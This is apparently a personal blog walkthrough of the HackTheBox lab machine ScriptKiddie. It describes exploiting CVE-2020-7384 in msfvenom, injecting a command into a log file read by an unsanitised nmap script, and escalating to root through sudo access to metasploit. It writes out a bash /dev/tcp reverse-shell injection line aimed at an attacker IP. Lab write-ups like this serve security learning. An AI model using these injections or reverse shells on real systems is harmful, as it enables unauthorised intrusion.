---
layout: walkthrough
title: HackTheBox - ScriptKiddie
date: 2021-06-06 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/scriptkiddie.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at ScriptKiddie --`10.10.10.226`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/ScriptKiddie/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Delivery$ nmap -sC -sV 10.10.10.226
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 03:52 EDT
Nmap scan report for 10.10.10.226
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.16 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `scriptkiddie.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by doing navigating to port 5000 which was hosting a web server:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/ScriptKiddie/img1.png"  style="width: 80%" />
</p>


The web application hosted a number of "Hacking Tools". The Nmap and Payloads fields didn't seem to be vulnerable, however when inserting a quotation mark into the sploits field, I received the following message:

```text
stop hacking me - well hack you back
```

I attempted to do a few different escapes, but nothing seemed to stick so I decided to go back and focus my efforts on the other tools. Having a look at the Payloads section, which takes in a msfvenom template file, I came across the following exploit: <https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/>. Searching a bit more for CVE-2020-7384, I came across the following Github PoC: <https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md> which I modified to generate a malicious apk file. The payload field itself was modified to generate a simple netcat reverse shell which was directed to my local machine.

Since it was an apk file that was generated, I navigated back to the web application's payloads option, selected the Operating System as Android and set the lhost to `127.0.0.1`. I then clicked the `generate` button and managed to receive a connection back:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/ScriptKiddie/img2.png"  style="width: 80%" />
</p>

## Lateral Movement using Kid
Success! With access to the host, I started off by performing some basic enumeration:

<details>

```bat

kid@scriptkiddie:~/html$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
<;/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux scriptkiddie 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
scriptkiddie
 
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
 
ifconfig:
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.226  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:4fc5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:4fc5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:4f:c5  txqueuelen 1000  (Ethernet)
        RX packets 187743  bytes 15840386 (15.8 MB)
        RX errors 0  dropped 79  overruns 0  frame 0
        TX packets 184594  bytes 23479644 (23.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8918  bytes 603998 (603.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8918  bytes 603998 (603.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
kid
```

</details>

From there, I browsed through the host and saw that a `.msf4` directory existed. Additionally, I saw that there were 2 home directories, namely: `kid` and `pwn`. The `pwn` 
directory contained a script file named `scanlosers.sh`, the contents of the file are shown below:

<details>

```bash
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```
</details>

The file called a "hackers" log file which was owned by my `kid` user. The script file seemed to simply take the contents of the file and run an nmap scan. However, it didn't perform any sanitisation checks. Since the "hackers" file was owned by my user, I decided to modify the file to include a reverse shell:

```bash
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/9001 0>&1' #" >> hackers
```

The exploit required 2 whitespaces before the exploit code since the script ran `cut` on a whitespace and selected the third field to inject into the nmap command. Once the file was modified, I stared a netcat listener and waited for a connection back to my machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/ScriptKiddie/img3.png"  style="width: 80%" />
</p>

## Privilege Escalation using Pwn

Success! Now that I had access to the pwn user, I started some basic enumeration again and found that the user could run metasploit as root without a password:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/ScriptKiddie/img4.png"  style="width: 80%" />
</p>

I ran metasploit as root and I had root access to the machine! That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.